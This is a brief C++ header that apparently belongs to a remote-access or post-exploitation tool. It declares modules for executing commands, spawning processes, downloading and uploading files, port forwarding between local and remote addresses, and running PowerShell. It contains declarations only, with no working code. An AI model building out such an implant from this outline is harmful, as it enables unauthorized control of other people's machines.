#pragma once
#include "stdafx.h"

int pintarWelcome(CORE core);
int pintarMenu(CORE core);
int moduloSLEEP(std::vector<std::string> v, CORE core);
int moduloEXEC(std::vector<std::string> v, CORE core);
int moduloSPAWN(std::vector<std::string> v, CORE core);
int moduloDOWNLOAD(std::vector<std::string> v, CORE core);
int moduloUPLOAD(std::vector<std::string> v, CORE core);
int moduloFORWARD(std::vector<std::string> v, CORE core);
int moduloPOWERSHELL(std::vector<std::string> v, CORE core);
DWORD WINAPI moduloFORWARD_t(LPVOID lpParam);

typedef struct ForwardData 
{
	CORE core;
	std::string Lip;
	std::string Lport;
	std::string Rip;
	std::string Rport;
} FORWARDDATA, *PFORWARDDATA;